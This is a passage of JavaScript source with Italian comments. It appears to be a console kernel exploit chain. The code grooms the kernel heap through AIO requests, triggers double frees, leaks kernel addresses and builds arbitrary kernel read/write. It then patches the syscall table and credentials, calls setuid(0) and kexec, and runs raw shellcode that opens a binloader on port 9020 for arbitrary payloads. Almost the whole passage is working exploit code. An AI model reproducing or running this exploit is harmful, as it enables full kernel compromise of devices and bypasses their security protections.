    const sysent_661 = kbase.add(offset_sysent_661);
    const sy_narg = debug_sy_narg;
    const sy_call = debug_sy_call;
    const sy_thrcnt = debug_sy_thrcnt;

    // patch
    kmem.write64(sysent_661, new Int(6, 0));
    kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
    kmem.write64(sysent_661.add(0x2c), new Int(1, 0));

    log('add JIT capabilities');
    kmem.write64(p_ucred.add(0x60), new Int(-1, 0));
    kmem.write64(p_ucred.add(0x68), new Int(-1, 0));

    const buf = await get_patches('./kpatch/900.elf');
    let map_size = buf.byteLength;
    const max_size = 0x10000000;
    if (map_size > max_size) {
        fullCleanup();
        die(`patch file too large (>${max_size}): ${map_size}`);
    }
    if (map_size === 0) {
        fullCleanup();
        die('patch file size is zero');
    }
    map_size = (map_size + page_size) & -page_size;

    const prot_rwx = 7;
    const prot_rx = 5;
    const prot_rw = 3;
    const exec_p = new Int(0, 9);
    const write_p = new Int(max_size, 9);
    const exec_fd = debug_exec_fd;
    const write_fd = debug_write_fd;

    const exec_addr = chain.sysp(
        'mmap',
        exec_p,
        map_size,
        prot_rx,
        MAP_SHARED | MAP_FIXED,
        exec_fd,
        0,
    );
    const write_addr = chain.sysp(
        'mmap',
        write_p,
        map_size,
        prot_rw,
        MAP_SHARED | MAP_FIXED,
        write_fd,
        0,
    );

    sysi('mlock', exec_addr, map_size);
    mem.cpy(write_addr, new View1(buf, 0x1000).addr, buf.byteLength);

    sys_void('kexec', exec_addr, ...restore_info);

    sys_void('setuid', 0);

    // restore sysent
    kmem.write64(sysent_661, new Int(debug_sy_narg, 0));
    kmem.write64(sysent_661.add(8), debug_sy_call);
    kmem.write64(sysent_661.add(0x2c), new Int(debug_sy_thrcnt, 0));

    sessionStorage.setItem('jbsuccess', 1);
}

// 11) setup (prepara block AIO e heap grooming)
function setup(block_fd) {
    log('block AIO');
    const reqs1 = new Buffer(0x28 * num_workers);
    const block_id = new Word();
    for (let i = 0; i < num_workers; i++) {
        reqs1.write32(8 + i * 0x28, 1);
        reqs1.write32(0x20 + i * 0x28, block_fd);
    }
    aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);

    log('heap grooming');
    const num_reqs = 3;
    const groom_ids = new View4(num_grooms);
    const greqs = make_reqs1(num_reqs);
    spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids.addr, false);
    cancel_aios(groom_ids.addr, num_grooms);
    return [block_id, groom_ids];
}

// 12) runBinLoader (avvia binloader)
function runBinLoader() {
    const PROT_READ = 1;
    const PROT_WRITE = 2;
    const PROT_EXEC = 4;

    const loader_addr = chain.sysp(
        'mmap',
        new Int(0, 0),
        0x1000,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_SHARED,
        -1,
        0
    );

    const payload_loader = malloc32(0x1000);
    const BLDR = payload_loader.backing;
    BLDR[0]  = 0x56415741;  BLDR[1]  = 0x83485541;  BLDR[2]  = 0x894818EC;
    BLDR[3]  = 0xC748243C;  BLDR[4]  = 0x10082444;  BLDR[5]  = 0x483C2302;
    BLDR[6]  = 0x102444C7;  BLDR[7]  = 0x00000000;  BLDR[8]  = 0x000002BF;
    BLDR[9]  = 0x0001BE00;  BLDR[10] = 0xD2310000;  BLDR[11] = 0x00009CE8;
    BLDR[12] = 0xC7894100;  BLDR[13] = 0x8D48C789;  BLDR[14] = 0xBA082474;
    BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8;  BLDR[17] = 0xFF894400;
    BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800;  BLDR[20] = 0x89440000;
    BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2;  BLDR[23] = 0x89410000;
    BLDR[24] = 0x2C8B4CC6;  BLDR[25] = 0x45C64124;  BLDR[26] = 0x05EBC300;
    BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
    BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
    BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
    BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
    BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
    BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
    BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
    BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
    BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
    BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
    BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
    BLDR[60] = 0xC3050FCA;

    chain.sys('mprotect', payload_loader, 0x4000, (PROT_READ | PROT_WRITE | PROT_EXEC));
    const pthread = malloc(0x10);
    sysi('mlock', loader_addr, 0x300000);

    call_nze(
        'pthread_create',
        pthread,
        0,
        payload_loader,
        loader_addr
    );

    log('BinLoader is ready. Send a payload to port 9020 now');
}

function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    nogc.push(backing);
    var ptr = mem.readp(mem.addrof(backing).add(0x10));
    ptr.backing = backing;
    return ptr;
}

function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    nogc.push(backing);
    var ptr = mem.readp(mem.addrof(backing).add(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
}

function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = mem.addrof(og_array).add(0x10);
    mem.write64(og_array_i, addr);
    mem.write32(og_array_i.add(0x8), size);
    mem.write32(og_array_i.add(0xC), 0x1);
    nogc.push(og_array);
    return og_array;
}

// ------------------------------------------------------------
// FUNZIONE DI CLEANUP COMPLETO
// ------------------------------------------------------------
function fullCleanup() {
    log("🔧 Inizio Full Cleanup");

    // 1) Ripristino pipebuf
    try {
        if (debug_kpipe !== null && debug_pipe_save) {
            for (let off = 0; off < debug_pipe_save.size; off += 8) {
                const old_val = debug_pipe_save.read64(off);
                kmem.write64(debug_kpipe.add(off), old_val);
            }
            log("✅ Pipebuf ripristinata");
        }
    } catch (e) {
        log(`❌ Errore ripristino pipebuf: ${e}`);
    }

    // 2) Cleanup AIO residuali
    try {
        if (debug_leak_ids_p && debug_leak_ids_len) {
            free_aios(debug_leak_ids_p, debug_leak_ids_len);
            log(`✅ AIO freed (ids_p: 0x${debug_leak_ids_p.toString(16)}, len: ${debug_leak_ids_len})`);
        }
    } catch (e) {
        log(`❌ Errore free_aios: ${e}`);
    }

    // 3) Cleanup socket IPv6
    try {
        const zeroBuf = new Buffer(0x100);
        for (const sd of debug_sds) {
            try {
                setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
                setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, zeroBuf.size);
                setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
            } catch (_) {}
            try {
                close(sd);
            } catch (_) {}
        }
        log(`✅ Tutti i socket IPv6 (${debug_sds.length}) chiusi e pktopts pulite`);
    } catch (e) {
        log(`❌ Errore cleanup sds: ${e}`);
    }

    // 4) Cleanup TCP/UDP/UNIX sockets
    try {
        for (const sd of debug_tcp_sds) {
            try { close(sd); } catch (_) {}
        }
        log(`✅ Tutti i socket TCP/UDP (${debug_tcp_sds.length}) chiusi`);
    } catch (e) {
        log(`❌ Errore cleanup tcp_sds: ${e}`);
    }

    // 5) Cleanup Event-Flag
    try {
        for (const id of debug_evf_ids) {
            try { free_evf(id); } catch (_) {}
        }
        log(`✅ Tutti gli evf (${debug_evf_ids.length}) liberati`);
    } catch (e) {
        log(`❌ Errore cleanup evf_ids: ${e}`);
    }

    // 6) Distruggere barrier pthread
    try {
        if (debug_barrier_id !== null) {
            call_nze('pthread_barrier_destroy', debug_barrier_id.addr);
            log(`✅ Barrier (${debug_barrier_id.addr.toString(16)}) distrutta`);
        }
    } catch (e) {
        log(`❌ Errore barrier destroy: ${e}`);
    }

    // 7) Riprendere thread sospesi
    try {
        for (const tid of debug_suspended) {
            try { sysi('thr_resume_ucontext', tid); } catch (_) {}
        }
        log(`✅ Thread sospesi (${debug_suspended.length}) ripresi`);
    } catch (e) {
        log(`❌ Errore resume threads: ${e}`);
    }

    // 8) Cleanup FD JIT
    try {
        if (debug_exec_fd !== undefined) close(debug_exec_fd);
        if (debug_write_fd !== undefined) close(debug_write_fd);
        log("✅ JIT FD (exec_fd/write_fd) chiusi");
    } catch (e) {
        log(`❌ Errore chiusura JIT FD: ${e}`);
    }

    // 9) Ripristino sysent
    try {
        if (debug_kbase && debug_offset661 !== 0) {
            const sysent_661 = debug_kbase.add(debug_offset661);
            kmem.write64(sysent_661, new Int(debug_sy_narg, 0));
            kmem.write64(sysent_661.add(8), debug_sy_call);
            kmem.write64(sysent_661.add(0x2c), new Int(debug_sy_thrcnt, 0));
            log("✅ Sysent 661 ripristinata");
        }
    } catch (e) {
        log(`❌ Errore restore sysent: ${e}`);
    }

    // 10) Chiusura pipe primitive
    try {
        if (typeof pipes !== 'undefined') {
            close(pipes[0]);
            close(pipes[1]);
            log("✅ Pipe primitive chiuse");
        }
    } catch (e) {
        log(`❌ Errore close pipes: ${e}`);
    }

    log("🔧 Full Cleanup completato");
}

// ------------------------------------------------------------
// FUNZIONE PRINCIPALE kexploit()
// ------------------------------------------------------------
export async function kexploit() {
    await init();
    const _init_t2 = performance.now();

    // Pin a core 7 e priorità realtime
    const main_mask = new Long();
    get_our_affinity(main_mask);
    set_our_affinity(new Long(1 << main_core));
    sysi('rtprio_thread', RTP_SET, 0, rtprio.addr);

    // 1) Setup AIO e heap grooming
    const unix_pair = new View4(2);
    sysi('socketpair', AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
    const block_fd = unix_pair[0];
    const unblock_fd = unix_pair[1];
    debug_tcp_sds.push(block_fd, unblock_fd);

    let groom_ids = null;
    {
        const reqs1 = new Buffer(0x28 * num_workers);
        const block_id = new Word();
        for (let i = 0; i < num_workers; i++) {
            reqs1.write32(8 + i * 0x28, 1);
            reqs1.write32(0x20 + i * 0x28, block_fd);
        }
        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);

        const sds_temp = [];
        for (let i = 0; i < num_grooms; i++) {
            const sd = new_socket();
            sds_temp.push(sd);
        }
        debug_sds = sds_temp.slice();

        groom_ids = new View4(num_grooms);
        const greqs = make_reqs1(3);
        spray_aio(num_grooms, greqs.addr, 3, groom_ids.addr, false);
        cancel_aios(groom_ids.addr, num_grooms);
    }

    // 2) Double free AIO 0x80 zone
    const sd_pair = double_free_reqs2(debug_sds);
    debug_tcp_sds.push(sd_pair[0], sd_pair[1]);

    // 3) Leak indirizzi kernel
    let reqs1_addr, kbuf_addr, kernel_addr, target_id, evf;
    try {
        [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair);
    } catch (e) {
        fullCleanup();
        die(`Errore in leak_kernel_addrs: ${e}`);
    }

    // 4) Double free AIO 0x100 zone e corruzione pktopts
    let pktopts_sds, dirty_sd;
    try {
        [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], debug_sds);
    } catch (e) {
        fullCleanup();
        die(`Errore in double_free_reqs1: ${e}`);
    }
    debug_sds = debug_sds.concat(pktopts_sds);
    debug_tcp_sds.push(dirty_sd);

    // 5) Make arbitrary kernel read/write
    let kmem, pipes, kpipe, rsize;
    let pipes_read_fd, pipes_write_fd;
    try {
        const res_arw = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, debug_sds);
        kmem = {
            read64: res_arw.kread64,
            write64: res_arw.kwrite64
        };
        pipes_read_fd = res_arw.pipes_read_fd;
        pipes_write_fd = res_arw.pipes_write_fd;
        kpipe = res_arw.kpipe;
        rsize = res_arw.rsize;

        debug_pipe_save = res_arw.pipe_save; // pipe_save era definito globalmente
        debug_kpipe = kpipe;
    } catch (e) {
        fullCleanup();
        die(`Errore in make_kernel_arw: ${e}`);
    }

    // 6) Patch kernel
    // Imposta debug kbase
    const off_kstr = 0x7f6f27;
    const kbase = kernel_addr.sub(off_kstr);
    debug_kbase = kbase;

    const p_ucred = new Long(); // jolly placeholder, viene usato in patch_kernel()
    const restore_info = [kpipe, debug_pipe_save, null, null]; // null momentaneo

    try {
        await patch_kernel(kbase, kmem, p_ucred, restore_info);
    } catch (e) {
        fullCleanup();
        die(`Errore in patch_kernel: ${e}`);
    }

    // 7) Run BinLoader
    try {
        runBinLoader();
    } catch (e) {
        fullCleanup();
        die(`Errore in runBinLoader: ${e}`);
    }

    // 8) Cleanup finale
    fullCleanup();

    // 9) Debug output finale
    log("――――――――〰 DEBUG FINALE 〰――――――――");
    log(`✴ leak_ids_p:     0x${debug_leak_ids_p ? debug_leak_ids_p.toString(16) : "null"}, len: ${debug_leak_ids_len}`);
    log(`✴ sds residui:    ${debug_sds.length ? debug_sds.join(", ") : "nessuno"}`);
    log(`✴ tcp_sds residui:${debug_tcp_sds.length ? debug_tcp_sds.join(", ") : "nessuno"}`);
    log(`✴ evf_ids:        ${debug_evf_ids.length ? debug_evf_ids.join(", ") : "nessuno"}`);
    log(`✴ barrier_id:     ${debug_barrier_id ? debug_barrier_id.addr.toString(16) : "null"}`);
    log(`✴ suspended_tids: ${debug_suspended.length ? debug_suspended.join(", ") : "nessuno"}`);
    log(`✴ JIT exec_fd:    ${debug_exec_fd !== undefined ? debug_exec_fd : "nessuno"}, write_fd: ${debug_write_fd !== undefined ? debug_write_fd : "nessuno"}`);
    log(`✴ kpipe_addr:     ${debug_kpipe ? "0x" + debug_kpipe.toString(16) : "null"}`);
    log(`✴ pipe_save size: ${debug_pipe_save ? debug_pipe_save.size : 0}`);
    log(`✴ sysent_661 info: base=0x${debug_kbase ? debug_kbase.toString(16) : "null"}, off=0x${debug_offset661.toString(16)}, sy_narg=${debug_sy_narg}`);

    // 10) Chiudiamo block e groom se rimasto qualcosa
    try {
        close(block_fd);
        close(unblock_fd);
    } catch (_) {}
}

 
